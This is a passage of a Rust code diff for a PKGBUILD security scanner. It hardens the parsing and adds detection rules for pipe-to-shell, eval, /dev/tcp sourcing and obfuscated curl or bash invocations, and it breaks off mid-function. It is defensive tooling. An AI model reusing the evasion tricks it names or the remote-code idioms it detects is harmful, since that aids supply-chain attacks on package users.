@@ -463,32 +463,51 @@ fn skip_balanced(
     open: &str,
     close: &str,
 ) -> Result<usize, BluelineError> {
-    let text: String = chars[dollar..].iter().collect();
-    let inner_start = dollar + prefix_len;
+    let open_chars: Vec<char> = open.chars().collect();
+    let close_chars: Vec<char> = close.chars().collect();
+    let tail: Vec<char> = chars[dollar..].to_vec();
     let mut depth = 0usize;
-    let mut i = inner_start;
-    let mut nesting = 0usize;
-    while i < chars.len() {
-        nesting += 1;
-        if nesting > 4096 {
+    let mut i = prefix_len;
+    let mut steps = 0usize;
+    while i < tail.len() {
+        steps += 1;
+        if steps > 4096 {
             return Err(pkgbuild_err("substitution too long".to_string()));
         }
-        if text[i - dollar..].starts_with(open) {
+        if tail[i..].starts_with(&open_chars) {
             depth += 1;
-            i += open.len();
+            i += open_chars.len();
             continue;
         }
-        if text[i - dollar..].starts_with(close) {
+        if tail[i..].starts_with(&close_chars) {
             if depth == 0 {
-                return Ok(i + close.len());
+                return Ok(dollar + i + close_chars.len());
             }
             depth -= 1;
-            i += close.len();
+            i += close_chars.len();
             continue;
         }
-        if depth == 0 && open == "(" && (chars[i] == '\'' || chars[i] == '"') {
-            let quote = chars[i];
-            i = skip_quoted(chars, i, quote)?;
+        if depth == 0 && open == "(" && (tail[i] == '\'' || tail[i] == '"') {
+            let quote = tail[i];
+            let mut j = i + 1;
+            let mut closed = false;
+            while j < tail.len() {
+                if tail[j] == '\\' {
+                    j += 2;
+                    continue;
+                }
+                if tail[j] == quote {
+                    closed = true;
+                    break;
+                }
+                j += 1;
+            }
+            if !closed {
+                return Err(pkgbuild_err(
+                    "unterminated quote in substitution".to_string(),
+                ));
+            }
+            i = j + 1;
             continue;
         }
         i += 1;
@@ -496,6 +515,27 @@ fn skip_balanced(
     Err(pkgbuild_err(
         "unterminated command substitution".to_string(),
     ))
+}
+
+fn join_continuations(input: &str) -> String {
+    let chars: Vec<char> = input.chars().collect();
+    let mut out = String::with_capacity(input.len());
+    let mut in_single = false;
+    let mut i = 0;
+    while i < chars.len() {
+        let ch = chars[i];
+        if ch == '\'' {
+            in_single = !in_single;
+            out.push(ch);
+        } else if ch == '\\' && !in_single && i + 1 < chars.len() && chars[i + 1] == '\n' {
+            i += 2;
+            continue;
+        } else {
+            out.push(ch);
+        }
+        i += 1;
+    }
+    out
 }
 
 fn logical_complete(buf: &str) -> bool {
@@ -578,7 +618,8 @@ fn strip_comment(line: &str) -> &str {
         } else if ch == '#' && prev_boundary {
             return line[..idx].trim_end();
         } else {
-            prev_boundary = ch.is_whitespace() || matches!(ch, ';' | '&' | '|' | '(' | '{');
+            prev_boundary =
+                ch.is_whitespace() || matches!(ch, ';' | '&' | '|' | '(' | '{' | ')' | '<' | '>');
         }
     }
     line
@@ -592,8 +633,8 @@ fn split_array_elements(body: &str) -> Result<Vec<String>, BluelineError> {
     let mut escaped = false;
     let mut depth_paren = 0usize;
     let mut depth_brace = 0usize;
-    let mut chars = body.chars().peekable();
-    while let Some(ch) = chars.next() {
+    let body_chars: Vec<char> = body.chars().collect();
+    for ch in body_chars {
         if escaped {
             current.push('\\');
             current.push(ch);
@@ -654,12 +695,8 @@ fn split_array_elements(body: &str) -> Result<Vec<String>, BluelineError> {
                     elements.push(std::mem::take(&mut current));
                 }
             }
-            '#' => {
-                current.push(ch);
-                for rest in chars.by_ref() {
-                    current.push(rest);
-                }
-            }
+            // A surviving `#` is mid-word (line comments were stripped per
+            // line before joining), so it is an ordinary character.
             _ => current.push(ch),
         }
         if elements.len() > MAX_ARRAY_ELEMENTS {
@@ -681,47 +718,58 @@ fn split_array_elements(body: &str) -> Result<Vec<String>, BluelineError> {
     Ok(elements)
 }
 
-fn func_head(line: &str) -> Option<String> {
-    let trimmed = line.trim();
-    let rest = trimmed
-        .strip_prefix("function")
-        .filter(|r| r.is_empty() || r.starts_with(char::is_whitespace) || r.starts_with('-'))?;
-    let rest = if rest.is_empty() {
-        return None;
-    } else {
-        rest
-    };
-    let _ = rest;
-    let after_kw = trimmed["function".len()..].trim_start();
-    let name: String = after_kw
-        .chars()
-        .take_while(|c| is_name_char(*c, false))
-        .collect();
-    if name.is_empty() || !valid_name(&name) {
-        return None;
-    }
-    let tail = after_kw[name.len()..].trim_start();
-    let tail = tail.strip_prefix("()").unwrap_or(tail).trim_start();
-    if tail.is_empty() || tail.starts_with('{') || tail.starts_with('#') {
-        Some(name)
-    } else {
-        None
-    }
+fn is_func_name_char(ch: char) -> bool {
+    ch.is_ascii_alphanumeric() || matches!(ch, '_' | '-' | '.' | '+' | ':' | '@' | '/')
 }
 
-fn classic_func_head(line: &str) -> Option<String> {
+/// Function head plus body opener. Accepts `name() {`, `name () {`,
+/// `name() (`, `function name {`, `function name() {`. Split-package
+/// `package_foo-bar()` names carry hyphens, so function names allow `-`
+/// (variable names still do not). Returns the name and `{` or `(`.
+fn func_head(line: &str) -> Option<(String, char)> {
     let trimmed = line.trim();
-    let paren = trimmed.find('(')?;
-    let name = trimmed[..paren].trim();
-    if !valid_name(name) {
+    let after_kw = match trimmed.strip_prefix("function") {
+        Some(rest)
+            if rest.is_empty()
+                || rest.starts_with(char::is_whitespace)
+                || rest.starts_with('-') =>
+        {
+            rest.trim_start()
+        }
+        Some(_) => return None,
+        None => trimmed,
+    };
+    if after_kw.is_empty() {
         return None;
     }
-    let tail = trimmed[paren..].trim_start_matches('(').trim_start();
-    let tail = tail.strip_prefix(')').unwrap_or(tail).trim_start();
-    if tail.is_empty() || tail.starts_with('{') || tail.starts_with('#') {
-        Some(name.to_string())
-    } else {
-        None
+    let name: String = after_kw
+        .chars()
+        .take_while(|c| is_func_name_char(*c))
+        .collect();
+    if name.is_empty() {
+        return None;
+    }
+    let mut tail = after_kw[name.len()..].trim_start();
+    if tail.starts_with('(') {
+        let mut depth = 0usize;
+        let mut end = None;
+        for (idx, ch) in tail.char_indices() {
+            if ch == '(' {
+                depth += 1;
+            } else if ch == ')' {
+                depth -= 1;
+                if depth == 0 {
+                    end = Some(idx);
+                    break;
+                }
+            }
+        }
+        tail = tail[end?..].trim_start_matches(')').trim_start();
+    }
+    match tail.chars().next() {
+        Some('{') => Some((name, '{')),
+        Some('(') => Some((name, '(')),
+        _ => None,
     }
 }
 
@@ -756,21 +804,21 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
             PKGBUILD_MAX_LINES
         )));
     }
-    let joined = input.replace("\\\n", "");
+    let joined = join_continuations(input);
     let mut folded = FoldedPkgbuild {
         suspicious_unicode: contains_suspicious_unicode(input),
-        has_indirection: has_true_indirection(input),
+        has_indirection: false,
         ..FoldedPkgbuild::default()
     };
     let mut raw_scalars: HashMap<String, String> = HashMap::new();
     let mut raw_arrays: HashMap<String, Vec<String>> = HashMap::new();
-    let mut indexed: HashMap<String, Vec<(usize, String, bool)>> = HashMap::new();
     let mut assoc_raw: HashMap<String, Vec<String>> = HashMap::new();
     let mut assignment_count = 0usize;
     let mut ordered: Vec<RawAssign> = Vec::new();
 
     let lines: Vec<&str> = joined.lines().collect();
     let mut idx = 0;
+    let mut top_shell = String::new();
     while idx < lines.len() {
         let line = lines[idx];
         let code = strip_comment(line);
@@ -778,21 +826,73 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
             idx += 1;
             continue;
         }
-        if let Some(name) = func_head(code).or_else(|| classic_func_head(code)) {
-            let start = line.find('{');
+        if let Some((name, opener)) = func_head(code) {
+            let closer = if opener == '{' { '}' } else { ')' };
             let mut body = String::new();
             let mut depth = 0usize;
             let mut started = false;
+            let mut in_single = false;
+            let mut in_double = false;
+            let mut escaped = false;
             let mut j = idx;
             while j < lines.len() {
-                for ch in lines[j].chars() {
-                    if ch == '{' {
+                let text = lines[j];
+                let mut k = 0;
+                let text_chars: Vec<char> = text.chars().collect();
+                while k < text_chars.len() {
+                    let ch = text_chars[k];
+                    if escaped {
+                        escaped = false;
+                        if started {
+                            body.push(ch);
+                        }
+                        k += 1;
+                        continue;
+                    }
+                    if ch == '\\' && !in_single {
+                        escaped = true;
+                        if started {
+                            body.push(ch);
+                        }
+                        k += 1;
+                        continue;
+                    }
+                    if in_single {
+                        if started {
+                            body.push(ch);
+                        }
+                        if ch == '\'' {
+                            in_single = false;
+                        }
+                        k += 1;
+                        continue;
+                    }
+                    if in_double {
+                        if started {
+                            body.push(ch);
+                        }
+                        if ch == '"' {
+                            in_double = false;
+                        }
+                        k += 1;
+                        continue;
+                    }
+                    if ch == '\'' {
+                        in_single = true;
+                    } else if ch == '"' {
+                        in_double = true;
+                    } else if ch == '#' {
+                        if started {
+                            body.push_str(&text_chars[k..].iter().collect::<String>());
+                        }
+                        break;
+                    } else if ch == opener {
                         depth += 1;
                         started = true;
-                    } else if ch == '}' {
+                    } else if ch == closer {
                         if depth == 0 {
                             return Err(pkgbuild_err(format!(
-                                "unbalanced brace in function `{name}`"
+                                "unbalanced `{closer}` in function `{name}`"
                             )));
                         }
                         depth -= 1;
@@ -803,11 +903,9 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                     if started && depth == 0 {
                         break;
                     }
+                    k += 1;
                 }
                 if started && depth == 0 {
-                    if start.is_none() && j == idx {
-                        body.clear();
-                    }
                     break;
                 }
                 body.push('\n');
@@ -820,6 +918,12 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                 idx += 1;
                 continue;
             }
+            let scan: String = body
+                .lines()
+                .map(strip_comment)
+                .collect::<Vec<_>>()
+                .join("\n");
+            folded.has_indirection |= has_true_indirection(&scan);
             folded.func_bodies.insert(name, body);
             idx = j + 1;
             continue;
@@ -837,14 +941,37 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
         if !logical_complete(&buffer) {
             return Err(pkgbuild_err("unterminated assignment".to_string()));
         }
+        folded.has_indirection |= has_true_indirection(&buffer);
         if let Some(assign) = parse_assignment(&buffer)? {
             assignment_count += 1;
             if assignment_count > MAX_ASSIGNMENTS {
                 return Err(pkgbuild_err("assignment cap exceeded".to_string()));
             }
             ordered.push(assign);
+            idx = end + 1;
+            continue;
+        }
+        // Not an assignment or function: top-level shell. `makepkg` sources
+        // the file, so these lines execute. `export`/`local` prefixes still
+        // carry assignments worth folding.
+        let unprefixed = ["export ", "local ", "declare ", "typeset "]
+            .iter()
+            .find_map(|prefix| buffer.strip_prefix(prefix))
+            .unwrap_or(&buffer);
+        if let Some(assign) = parse_assignment(unprefixed)? {
+            assignment_count += 1;
+            if assignment_count > MAX_ASSIGNMENTS {
+                return Err(pkgbuild_err("assignment cap exceeded".to_string()));
+            }
+            ordered.push(assign);
+        } else if !buffer.trim().is_empty() {
+            top_shell.push_str(buffer.trim());
+            top_shell.push('\n');
         }
         idx = end + 1;
+    }
+    if !top_shell.trim().is_empty() {
+        folded.func_bodies.insert("<top>".to_string(), top_shell);
     }
     for assign in ordered {
         match assign {
@@ -880,7 +1007,18 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                 value,
                 append,
             } => {
-                indexed.entry(name).or_default().push((idx, value, append));
+                if idx >= MAX_ARRAY_ELEMENTS {
+                    return Err(pkgbuild_err(format!("array `{name}` index out of range")));
+                }
+                let entry = raw_arrays.entry(name.clone()).or_default();
+                while entry.len() <= idx {
+                    entry.push("$(__blueline_pad)".to_string());
+                }
+                if append {
+                    entry[idx].push_str(&value);
+                } else {
+                    entry[idx] = value;
+                }
             }
             RawAssign::Assoc { name, value } => {
                 assoc_raw.entry(name).or_default().push(value);
@@ -917,31 +1055,19 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
         let value = resolve_word(&parts, &snapshot);
         folded.scalars.insert(name.clone(), value);
     }
-    for (name, slots) in &indexed {
-        for (idx, value, append) in slots {
-            if *idx >= MAX_ARRAY_ELEMENTS {
-                return Err(pkgbuild_err(format!("array `{name}` index out of range")));
-            }
-            let entry = raw_arrays.entry(name.clone()).or_default();
-            while entry.len() <= *idx {
-                entry.push("<unknown>".to_string());
-            }
-            if *append {
-                entry[*idx].push_str(value);
-            } else {
-                entry[*idx] = value.clone();
-            }
-        }
-    }
     for (name, raws) in &raw_arrays {
         let mut values = Vec::with_capacity(raws.len().min(MAX_ARRAY_ELEMENTS));
         for raw in raws {
-            for expanded in expand_braces(raw) {
+            let (expanded, truncated) = expand_braces(raw);
+            for text in expanded {
                 if values.len() >= MAX_ARRAY_ELEMENTS {
                     return Err(pkgbuild_err(format!("array `{name}` exceeds element cap")));
                 }
-                let parts = split_words(&expanded)?;
+                let parts = split_words(&text)?;
                 values.push(resolve_word(&parts, &folded.scalars));
+            }
+            if truncated {
+                values.push(FoldedValue::Unknown);
             }
         }
         folded.arrays.insert(name.clone(), values);
@@ -956,7 +1082,9 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
     }
     for (name, raws) in &raw_arrays {
         if array_is_meta(name)
-            && raws.iter().any(|raw| contains_cmd_subst(raw))
+            && raws
+                .iter()
+                .any(|raw| raw != "$(__blueline_pad)" && contains_cmd_subst(raw))
             && !folded.meta_subst_arrays.contains(name)
         {
             folded.meta_subst_arrays.push(name.clone());
@@ -1069,12 +1197,32 @@ fn parse_assignment(code: &str) -> Result<Option<RawAssign>, BluelineError> {
     }
 }
 
+fn quote_token_word(text: &str) -> String {
+    if !text.is_empty()
+        && text.bytes().all(|b| {
+            b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b'/' | b':' | b'+' | b'@')
+        })
+    {
+        text.to_string()
+    } else {
+        let mut out = String::from("\"");
+        for ch in text.chars() {
+            if matches!(ch, '\\' | '"' | '$' | '`') {
+                out.push('\\');
+            }
+            out.push(ch);
+        }
+        out.push('"');
+        out
+    }
+}
+
 pub fn tokenize(input: &str) -> Result<Vec<String>, BluelineError> {
     let folded = parse_pkgbuild(input)?;
     let mut tokens = Vec::new();
     for (name, value) in &folded.scalars {
         match value {
-            FoldedValue::Known(text) => tokens.push(format!("{name}={text}")),
+            FoldedValue::Known(text) => tokens.push(format!("{name}={}", quote_token_word(text))),
             FoldedValue::Unknown => tokens.push(format!("{name}=<unknown>")),
         }
     }
@@ -1082,7 +1230,7 @@ pub fn tokenize(input: &str) -> Result<Vec<String>, BluelineError> {
         let rendered: Vec<String> = values
             .iter()
             .map(|value| match value {
-                FoldedValue::Known(text) => text.clone(),
+                FoldedValue::Known(text) => quote_token_word(text),
                 FoldedValue::Unknown => "<unknown>".to_string(),
             })
             .collect();
@@ -1099,13 +1247,15 @@ pub fn resolve_vars(tokens: &[String]) -> Result<FoldedPkgbuild, BluelineError> 
             .ok_or_else(|| pkgbuild_err("token without assignment".to_string()))?;
         if value.starts_with('(') && value.ends_with(')') {
             let body = &value[1..value.len() - 1];
-            let values = body
-                .split(' ')
+            let elements = split_array_elements(body)?;
+            let values = elements
+                .iter()
                 .map(|element| {
                     if element == "<unknown>" {
                         FoldedValue::Unknown
                     } else {
-                        FoldedValue::Known(element.to_string())
+                        let empty = HashMap::new();
+                        resolve_word(&split_words(element).unwrap_or_default(), &empty)
                     }
                 })
                 .collect();
@@ -1115,9 +1265,9 @@ pub fn resolve_vars(tokens: &[String]) -> Result<FoldedPkgbuild, BluelineError> 
                 .scalars
                 .insert(name.to_string(), FoldedValue::Unknown);
         } else {
-            folded
-                .scalars
-                .insert(name.to_string(), FoldedValue::Known(value.to_string()));
+            let empty = HashMap::new();
+            let resolved = resolve_word(&split_words(value).unwrap_or_default(), &empty);
+            folded.scalars.insert(name.to_string(), resolved);
         }
     }
     Ok(folded)
@@ -1170,8 +1320,17 @@ fn has_true_indirection(text: &str) -> bool {
             while j < bytes.len() && (bytes[j].is_ascii_alphanumeric() || bytes[j] == b'_') {
                 j += 1;
             }
-            if j > i + 3 && j < bytes.len() && bytes[j] == b'}' {
-                return true;
+            if j <= i + 3 || j >= bytes.len() {
+                i = j.max(i + 1);
+                continue;
+            }
+            // `${!name}` is true indirection. `${!arr[@]}`, `${!pre*}`,
+            // `${!pre@}` list keys instead and stay quiet.
+            match bytes[j] {
+                b'}' | b':' | b'/' | b'#' | b'%' | b'^' | b',' | b'-' | b'+' | b'=' | b'?' => {
+                    return true;
+                }
+                _ => {}
             }
             i = j;
         } else {
@@ -1369,7 +1528,7 @@ fn split_brace_once(word: &str) -> Vec<String> {
         .collect()
 }
 
-fn expand_braces(word: &str) -> Vec<String> {
+fn expand_braces(word: &str) -> (Vec<String>, bool) {
     let mut out = vec![word.to_string()];
     for _ in 0..4 {
         let mut next = Vec::new();
@@ -1381,7 +1540,7 @@ fn expand_braces(word: &str) -> Vec<String> {
             }
             next.extend(parts);
             if next.len() > 64 {
-                return next;
+                return (next, true);
             }
         }
         out = next;
@@ -1389,7 +1548,7 @@ fn expand_braces(word: &str) -> Vec<String> {
             break;
         }
     }
-    out
+    (out, false)
 }
 
 fn is_vcs_url(url: &str) -> bool {
@@ -1399,47 +1558,59 @@ fn is_vcs_url(url: &str) -> bool {
         .any(|scheme| lower.starts_with(scheme))
 }
 
-fn has_signed_story(folded: &FoldedPkgbuild) -> bool {
-    let has_sig = arrays_matching(folded, "source")
-        .iter()
-        .flat_map(|(_, values)| values.iter())
-        .filter_map(known_text)
-        .any(|url| {
-            let base = url.split('#').next().unwrap_or(url).to_lowercase();
-            base.ends_with(".sig") || base.ends_with(".asc") || base.ends_with(".sign")
-        });
-    let has_keys = arrays_matching(folded, "validpgpkeys")
-        .iter()
-        .flat_map(|(_, values)| values.iter())
-        .filter_map(known_text)
-        .any(|key| !key.trim().is_empty());
-    has_sig && has_keys
+fn url_covered_by_sig_or_vcs(url: &str) -> bool {
+    if is_vcs_url(url) {
+        return true;
+    }
+    let base = url.split('#').next().unwrap_or(url).to_lowercase();
+    base.ends_with(".sig") || base.ends_with(".asc") || base.ends_with(".sign")
+}
+
+fn paired_source<'a>(folded: &'a FoldedPkgbuild, sum_name: &str) -> Option<&'a Vec<FoldedValue>> {
+    for stem in CHECKSUM_ARRAYS {
+        if let Some(suffix) = sum_name.strip_prefix(stem)
+            && (suffix.is_empty() || suffix.starts_with('_'))
+        {
+            let source_name = format!("source{suffix}");
+            if let Some(values) = folded.arrays.get(&source_name) {
+                return Some(values);
+            }
+        }
+    }
+    None
 }
 
 fn check_r11(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     let mut skipped: Vec<String> = Vec::new();
     for array in CHECKSUM_ARRAYS {
         for (name, values) in arrays_matching(folded, array) {
+            let sources = paired_source(folded, name);
+            let keys_present = arrays_matching(folded, "validpgpkeys")
+                .iter()
+                .flat_map(|(_, values)| values.iter())
+                .filter_map(known_text)
+                .any(|key| !key.trim().is_empty());
             for (idx, value) in values.iter().enumerate() {
-                if matches!(value, FoldedValue::Known(text) if text.eq_ignore_ascii_case("SKIP")) {
+                if !matches!(value, FoldedValue::Known(text) if text.eq_ignore_ascii_case("SKIP")) {
+                    continue;
+                }
+                // A SKIP is covered when the paired source entry is VCS
+                // (commit-pinned, nothing to checksum) or a signature file
+                // backed by validpgpkeys. Unknown or unpaired entries stay
+                // loud: fail closed.
+                let covered = sources
+                    .and_then(|urls| urls.get(idx))
+                    .and_then(known_text)
+                    .is_some_and(|url| {
+                        is_vcs_url(url) || (keys_present && url_covered_by_sig_or_vcs(url))
+                    });
+                if !covered {
                     skipped.push(format!("{name}[{idx}]"));
                 }
             }
         }
     }
     if skipped.is_empty() {
-        return Vec::new();
-    }
-    if has_signed_story(folded) {
-        return Vec::new();
-    }
-    let vcs_only = arrays_matching(folded, "source")
-        .iter()
-        .flat_map(|(_, values)| values.iter())
-        .filter_map(known_text)
-        .all(is_vcs_url);
-    let has_source = !arrays_matching(folded, "source").is_empty();
-    if has_source && vcs_only {
         return Vec::new();
     }
     // INFO until tuned: the benign corpus shows real maintainers skip
@@ -1452,29 +1623,42 @@ fn check_r11(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     }]
 }
 
-fn strip_url_fragment(url: &str) -> &str {
-    url.split('#').next().unwrap_or(url)
-}
-
-fn source_urls(folded: &FoldedPkgbuild) -> Vec<String> {
-    arrays_matching(folded, "source")
-        .iter()
-        .flat_map(|(_, values)| values.iter())
-        .filter_map(known_text)
-        .map(|url| strip_url_fragment(url).to_string())
-        .collect()
+fn source_known_urls(folded: &FoldedPkgbuild) -> (Vec<String>, bool) {
+    let mut urls = Vec::new();
+    let mut blind = false;
+    for (_, values) in arrays_matching(folded, "source") {
+        for value in values {
+            match known_text(value) {
+                Some(url) => urls.push(url.to_string()),
+                None => blind = true,
+            }
+        }
+    }
+    urls.sort();
+    (urls, blind)
 }
 
 fn check_r12_pair(baseline: &FoldedPkgbuild, target: &FoldedPkgbuild) -> Vec<PkgFinding> {
-    let base_urls = source_urls(baseline);
-    let target_urls = source_urls(target);
+    let (base_urls, base_blind) = source_known_urls(baseline);
+    let (target_urls, target_blind) = source_known_urls(target);
+    let mut findings = Vec::new();
+    if base_blind || target_blind {
+        // Fail-closed lean: unresolvable entries make the drift check blind.
+        findings.push(PkgFinding {
+            rule_id: "R12_SOURCE_URL_DRIFT".to_string(),
+            severity: VerdictBand::Low,
+            evidence: "source entries unresolvable; drift comparison blind".to_string(),
+        });
+    }
     if base_urls == target_urls {
-        return Vec::new();
+        return findings;
     }
     let base_ver = baseline.scalars.get("pkgver").and_then(known_text);
     let target_ver = target.scalars.get("pkgver").and_then(known_text);
-    if base_ver != target_ver {
-        return Vec::new();
+    // A pkgver bump explains URL movement. Unknown versions cannot prove a
+    // bump, so the comparison still runs: fail closed.
+    if base_ver.is_some() && target_ver.is_some() && base_ver != target_ver {
+        return findings;
     }
     let changed: Vec<String> = target_urls
         .iter()
@@ -1483,32 +1667,68 @@ fn check_r12_pair(baseline: &FoldedPkgbuild, target: &FoldedPkgbuild) -> Vec<Pkg
         .cloned()
         .collect();
     if changed.is_empty() {
-        return Vec::new();
+        return findings;
     }
-    vec![PkgFinding {
+    findings.push(PkgFinding {
         rule_id: "R12_SOURCE_URL_DRIFT".to_string(),
         severity: VerdictBand::Medium,
         evidence: format!(
             "source URL changed while pkgver stayed `{}`: {}",
-            target_ver.unwrap_or("?"),
+            target_ver.or(base_ver).unwrap_or("?"),
             changed.join(", ")
         ),
-    }]
+    });
+    findings
+}
+
+fn array_lookup(folded: &FoldedPkgbuild, name: &str, subscript: Option<&str>) -> Option<String> {
+    let values = folded.arrays.get(name)?;
+    match subscript {
+        None => values.first().and_then(known_text).map(str::to_string),
+        Some(s) if s == "@" || s == "*" => {
+            let parts: Vec<&str> = values.iter().filter_map(known_text).collect();
+            if parts.len() == values.len() && !parts.is_empty() {
+                Some(parts.join(" "))
+            } else {
+                None
+            }
+        }
+        Some(s) => s
+            .parse::<usize>()
+            .ok()
+            .and_then(|idx| values.get(idx))
+            .and_then(known_text)
+            .map(str::to_string),
+    }
 }
 
 fn fold_body_vars(body: &str, folded: &FoldedPkgbuild) -> String {
     let mut out = String::with_capacity(body.len());
     let chars: Vec<char> = body.chars().collect();
     let mut i = 0;
+    let emit = |out: &mut String, original: &str, resolved: Option<String>| match resolved {
+        Some(value) => out.push_str(&value),
+        None => out.push_str(original),
+    };
     while i < chars.len() {
         if chars[i] == '$' && i + 1 < chars.len() {
             if chars[i + 1] == '{' {
                 if let Some(end) = chars[i + 2..].iter().position(|c| *c == '}') {
-                    let name: String = chars[i + 2..i + 2 + end].iter().collect();
-                    match folded.scalars.get(&name) {
-                        Some(FoldedValue::Known(value)) => out.push_str(value),
-                        _ => out.push_str(&chars[i..i + 2 + end + 1].iter().collect::<String>()),
-                    }
+                    let inner: String = chars[i + 2..i + 2 + end].iter().collect();
+                    let original: String = chars[i..i + 2 + end + 1].iter().collect();
+                    let resolved = match inner.split_once('[') {
+                        None => folded
+                            .scalars
+                            .get(&inner)
+                            .and_then(known_text)
+                            .map(str::to_string)
+                            .or_else(|| array_lookup(folded, &inner, None)),
+                        Some((arr, rest)) => {
+                            let sub = rest.strip_suffix(']').unwrap_or(rest);
+                            array_lookup(folded, arr, Some(sub))
+                        }
+                    };
+                    emit(&mut out, &original, resolved);
                     i += 2 + end + 1;
                     continue;
                 }
@@ -1518,13 +1738,62 @@ fn fold_body_vars(body: &str, folded: &FoldedPkgbuild) -> String {
                     j += 1;
                 }
                 let name: String = chars[i + 1..j].iter().collect();
-                match folded.scalars.get(&name) {
-                    Some(FoldedValue::Known(value)) => out.push_str(value),
-                    _ => out.push_str(&chars[i..j].iter().collect::<String>()),
-                }
+                let original: String = chars[i..j].iter().collect();
+                let resolved = folded
+                    .scalars
+                    .get(&name)
+                    .and_then(known_text)
+                    .map(str::to_string)
+                    .or_else(|| array_lookup(folded, &name, None));
+                emit(&mut out, &original, resolved);
                 i = j;
                 continue;
             }
+        }
+        out.push(chars[i]);
+        i += 1;
+    }
+    out
+}
+
+/// Match-time normalization for shell text: decode `$'...'` spans and drop
+/// quote characters so `"cu"rl`, `$'\x63url'`, and `b"a"sh` match as the
+/// shell sees them. Evidence strings always use the original line.
+fn normalize_body_line(line: &str) -> String {
+    let mut out = String::with_capacity(line.len());
+    let chars: Vec<char> = line.chars().collect();
+    let mut i = 0;
+    while i < chars.len() {
+        if chars[i] == '$' && i + 2 < chars.len() && chars[i + 1] == '\'' {
+            let mut j = i + 2;
+            let mut body = String::new();
+            let mut closed = false;
+            while j < chars.len() {
+                if chars[j] == '\\' && j + 1 < chars.len() {
+                    body.push(chars[j]);
+                    body.push(chars[j + 1]);
+                    j += 2;
+                    continue;
+                }
+                if chars[j] == '\'' {
+                    closed = true;
+                    break;
+                }
+                body.push(chars[j]);
+                j += 1;
+            }
+            if closed {
+                match decode_ansi_c(&body) {
+                    Ok(decoded) => out.push_str(&decoded),
+                    Err(_) => out.push_str(&chars[i..=j].iter().collect::<String>()),
+                }
+                i = j + 1;
+                continue;
+            }
+        }
+        if chars[i] == '"' || chars[i] == '\'' {
+            i += 1;
+            continue;
         }
         out.push(chars[i]);
         i += 1;
@@ -1566,7 +1835,8 @@ fn check_r13(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     for (name, body) in &bodies {
         let resolved = fold_body_vars(body, folded);
         for line in resolved.lines() {
-            if line_matches_pipe_to_shell(line) {
+            let norm = normalize_body_line(line);
+            if line_matches_pipe_to_shell(&norm) {
                 let short: String = line.trim().chars().take(120).collect();
                 return vec![PkgFinding {
                     rule_id: "R13_PIPE_TO_SHELL".to_string(),
@@ -1579,14 +1849,24 @@ fn check_r13(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     Vec::new()
 }
 
+fn is_eval_word(word: &str) -> bool {
+    if word == "eval" {
+        return true;
+    }
+    word.strip_prefix("eval")
+        .is_some_and(|tail| matches!(tail.chars().next(), Some('"' | '\'' | '$' | '`' | '(')))
+}
+
 fn check_r14(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     let bodies = shell_bodies(folded);
     for (name, body) in &bodies {
         let resolved = fold_body_vars(body, folded);
         for line in resolved.lines() {
-            let lower = line.to_lowercase();
+            let norm = normalize_body_line(line);
+            let norm = norm.replace("${IFS}", " ").replace("$IFS", " ");
+            let lower = norm.to_lowercase();
             let words: Vec<&str> = lower.split_whitespace().collect();
-            if words.first() == Some(&"eval") && words.len() > 1 {
+            if words.iter().any(|word| is_eval_word(word)) {
                 // Static-only eval (freerdp's `eval "depends+=(...)"`) is a
                 // benign conditional-depends idiom. Only dynamic payloads,
                 // pipes, and fetchers indicate remote-code risk.
@@ -1626,10 +1906,37 @@ fn check_r14(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
                         evidence: format!("{name}(): process-substitution source {short}"),
                     }];
                 }
+                if arg.starts_with('$')
+                    || arg.starts_with('`')
+                    || *arg == "/dev/stdin"
+                    || *arg == "/dev/tcp"
+                    || arg.starts_with("/dev/tcp/")
+                {
+                    let short: String = line.trim().chars().take(120).collect();
+                    return vec![PkgFinding {
+                        rule_id: "R14_EVAL_FAMILY".to_string(),
+                        severity: VerdictBand::Medium,
+                        evidence: format!("{name}(): unresolvable source target {short}"),
+                    }];
+                }
+            }
+            if let Some(first) = words.first()
+                && (first.starts_with("source<") || first.starts_with(".<"))
+            {
+                let short: String = line.trim().chars().take(120).collect();
+                return vec![PkgFinding {
+                    rule_id: "R14_EVAL_FAMILY".to_string(),
+                    severity: VerdictBand::High,
+                    evidence: format!("{name}(): process-substitution source {short}"),
+                }];
             }
             let dynamic = lower.contains('$') || lower.contains('`');
             let fetcher = ["curl", "wget"].iter().any(|tool| lower.contains(tool));
-            if (lower.contains("bash -c") || lower.contains("sh -c")) && (dynamic || fetcher) {
+            let dash_c = words.windows(2).any(|window| {
+                let program = window[0].rsplit('/').next().unwrap_or(window[0]);
+                matches!(program, "bash" | "sh" | "dash" | "zsh") && window[1] == "-c"
+            });
+            if dash_c && (dynamic || fetcher) {
                 let short: String = line.trim().chars().take(120).collect();
                 return vec![PkgFinding {
                     rule_id: "R14_EVAL_FAMILY".to_string(),
@@ -1649,7 +1956,8 @@ fn check_r23(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     for (name, body) in &bodies {
         let resolved = fold_body_vars(body, folded);
         for line in resolved.lines() {
-            let lower = line.to_lowercase();
+            let norm = normalize_body_line(line);
+            let lower = norm.to_lowercase();
             let words: Vec<&str> = lower.split_whitespace().collect();
             for window in words.windows(2) {
                 if managers.contains(&window[0]) && verbs.contains(&window[1]) {
@@ -1714,7 +2022,8 @@ fn check_r17(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
         }
         let resolved = fold_body_vars(body, folded);
         for line in resolved.lines() {
-            let lower = line.to_lowercase();
